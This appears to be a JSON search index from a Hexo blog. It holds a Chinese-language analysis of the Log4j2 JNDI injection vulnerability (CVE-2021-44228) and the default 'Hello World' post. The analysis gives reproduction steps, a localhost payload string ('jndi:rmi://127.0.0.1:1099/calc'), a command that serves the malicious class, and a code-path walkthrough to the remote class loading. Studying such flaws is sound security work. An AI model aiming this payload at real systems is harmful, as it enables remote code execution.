[{"title":"Log4j2 JNDI 注入漏洞分析（CVE-2021-44228）","date":"2022-09-17T15:11:04.000Z","url":"/2022/09/17/log4j-CVE-2021-44228/","categories":[[" ",""]],"content":"前言此漏洞（CVE-2021-44228）是于2021年12月爆出来的“核弹”级漏洞，利用难度低、影响范围广、危害大。 漏洞原因：在 Apache Log4j2 直到 2.14.1（不包括安全版本 2.3.1、2.12.2 和 2.12.3）的版本中，配置、日志消息和参数中使用的 JNDI 功能不能防止攻击者控制的 LDAP 和其他JNDI 相关端点。当启用消息查找替换时，可以控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。 受影响版本：2.0-beta9 到 2.14.1 的所有版本 漏洞复现复现环境： Log4j2: 2.14.1 JDK：8u72 创建一个Maven工程，在pom.xml中导入Log4j2的依赖； 将一个存在恶意代码的类编译成 .class 文件（编译时不能有 package）； 用 python 启一个 Web 服务，把上一步生成的 .class 文件放到启 We服务的目录下；python -m http.server 8081访问 8081 端口能看到上传的 class 文件就行了； 编写服务端代码，将恶意类绑定到指定名称上； 要注意JDK版本，要用8u121之前的，因为在 8u121及之后，默认情况下禁止通过存储在命名和目录服务中的JNDI对象工厂进行远程类加载；要启用远程类加载需要将com.sun.jndi.rmi.object.trustURLCodebase和 com.sun.jndi.cosnaming.object.trustURLCodebase设为true；否则会报错： 编写 Log4j2 利用代码 复现成功： 漏洞分析从LOGGER.error跟起，调用了logIfEnabled()； 进入logIfEnabled()，if 里调用了Logger.isEnabled()进行判断； 然后又调用了filter()进行判断； 在filter()中判断了this.config.getFilter()是否为空，是为空，到达 return 语句，对level进行了判断；因为使用的是error()，所以这里的level值为200，满足条件，返回 true； 自然AbstractLogger.logIfEnabled()中的 if 判断为 true ，进入logMessage()；然后层层跟进：logMessageSafely() -&gt; logMessageTrackRecursion() -&gt; tryLogMessage() -&gt; Logger.log()； 判断了strategy是否是LocationAwareReliabilityStrategy接口实现类的实例； strategy默认是DefaultReliabilityStrategy类的实例，而这个类实现了LocationAwareReliabilityStrategy接口，所以判断为 true； 进入DefaultReliabilityStrategy.log() -&gt; LoggerConfig.log()； this.propertiesRequireLookup在构造方法中赋值为 false，进入 if 语句，this.properties被赋值为 null，所以props等于 null；this.logEventFactory是ReusableLogEventFactory类的对象，这个类实现了LocationAwareLogEventFactory接口，所以调用它的createEvent()，new 了一个Mutablelnstant对象，set 了一系列数据，将我们构造的JNDI表达式传入了setMessage()； 在setMessage()中调用了getMessageTextForWriting()，创建了一个初始容量为128的字符构建器messageText（INITIAL_REUSABLE_MESSAGE_SIZE默认值为128），将我们传入的 msg 放到了messageText中，长度为33。 然后调用getFormat()，如果传入的是字符串，那就返回该字符串给messageFormat； 最后将Mutablelnstant对象返回给logEvent； 接着进入重载的LoggerConfig.log()； 调用isFiltered()进行判断，this.filter为 null ，直接返回 false； 进入 if 语句，到LoggerConfig.processLogEvent()； if 里的allow()恒为 true； 进入callAppenders()，对event做了一个循环操作； 跟进到AppenderControl.callAppenfer()，shouldSkip()中的三个语句都返回为 false； 继续跟进到callAppenderPreventRecursion() -&gt; callAppender0，if 中又判断了是否有 filter 过滤，filter 任然为 null ，if 为 true； 进入tryCallAppender -&gt; AbstractOutputStreamAppender.append() -&gt; tryAppend()，ENABLE_DIRECT_ENCODER默认值为 true； 跟进directEncodeEvent() -&gt; PatternLayout.encode()； if 中的this.eventSerializer定义为如图所示，进入build()，会进入else if 或者 else 分支； return 的两个类都实现了Serializer2接口，所以PatternLayout.encode()中的 if 为 false，进入 else 分支； 跟进toText -&gt; toSerializable() ，这里进入了一个循环，formatters包含多个对象，循环调用每个 Converter 的format()方法； 每循环一次就会向buffer中添加数据； 漏洞的关键点在索引为8的MessagePatternConverter.format()； msg是MutableLogEvent类的实例，这个类实现了ReusableMessage接口，这个接口继承了StringBuilderFormattable，所以 if 为 true； doRender为 false， 所以workingBuilder设置为toAppendTo，即前面循环添加得到的buffer，这个时候长度为52，offset也为52； 接下来走的是 else 分支，把messageText添加到了workingBuilder中，长度变为了85，offset还是为52； 进入 if 中的 for 循环，从52的位置开始循环，也就是判断上面添加的messageText是否以$&#123;开头，这里显然成立，然后把我们传入的字符串取出给了value； 跟进StrSubtitutor.replace() -&gt; substitute() -&gt; 重载的substitute()，代码超级长； 先看一下现在的变量值； 进入 while ，isMatch()返回2，也就是说JNDI表达式是从索引2的位置开始的； 经过多次循环，找到JNDI表达式结束在索引为32的位置； 根据首尾位置，把jndi:rmi://127.0.0.1:1099/calc取了出来； 跟进resolveVariable() -&gt; Interpolator.lookup()；这里把JNDI表达式的第一个:的前后字符串分别取出，即jndi和rmi://127.0.0.1:1099/calc；从strLookupMap中获取jndi对应的 Lookup 对象JndiLookup； 197行进入JndiLookup.lookup() -&gt; jndiManager.lookup()，这里就是最终触发点了。 调用栈如下： lookup实现原理继续看一看lookup()里面是怎么实现远程类加载的吧。 跟进InitialContext.lookup() -&gt; getURLOrDefaultInitCtx() -&gt; NamingManager.getURLContext()，获取到使用了rmi； 继续到getURLObject()，根据schema得到一个rmiURLContextFactory类对象； 在rmiURLContextFactory.getObjectInstance()方法中 new 了一个rmiURLContext类对象； 逐步返回到InitialContext.lookup()，因为rmiURLContext继承了GenericURLContext，所以进入到GenericURLContext.lookup() -&gt; RegistryContext.lookup()-&gt; RegistryImpl_Stub.lookup()； RegistryContext.lookup()中的 var2 得到一个ReferenceWrapper_Stub类对象，跟进decodeObject()，获取从ReferenceWrapper_Stub返回的 Reference 对象； 跟进到NamingManager.getObjectInstance()，从 Reference 对象中获取到了 Factory （CalcCmd）的实例； 跟进到getObjectFactoryFromReference()，尝试用当前的类加载器加载 Factory（CalcCmd） 类，这里能成功加载，因为我是把命令执行代码写到 static 代码块中的，所以在这里一成功加载到类，就执行了命令。 如果在当前 ClassPath 中无法找到相应的类时，就使用指定的 codebase 加载；如果恶意代码写在 main 方法中，要到下面创建实例对象时才执行命令； 漏洞修复发布了修复版本2.15.0-rc1。 从 Log4j 2.15.0 开始，默认情况下禁用了消息查找功能。配置中的查找仍然有效。虽然 Log4j 2.15.0 可以选择以这种方式启用 Lookups，但强烈建议用户不要启用它。为 JNDI 连接引入了白名单机制，默认情况下只允许 localhost。但是2.15.0-rc1也很快被绕过了，找到了新的利用方式，不建议使用。 总结在打印日志的过程中，会识别$&#123;&#125;包含的字符串，并且会按:将字符串分隔；会判断:前面是什么内容，根据前面的类型来解析后面的内容，如： ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值； ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值； java：允许查找Java环境配置信息； jndi：允许通过 JNDI 检索变量； 我们使用jdni，那它就会通过JNDI来检索:后面的内容，即实现远程类加载。 同理，也可以构造其他类型的利用。 参考链接："},{"title":"Hello World","date":"2022-09-15T07:25:05.826Z","url":"/2022/09/15/hello-world/","categories":[[" ",""]],"content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post More info: Writing Run server More info: Server Generate static files More info: Generating Deploy to remote sites More info: Deployment"}]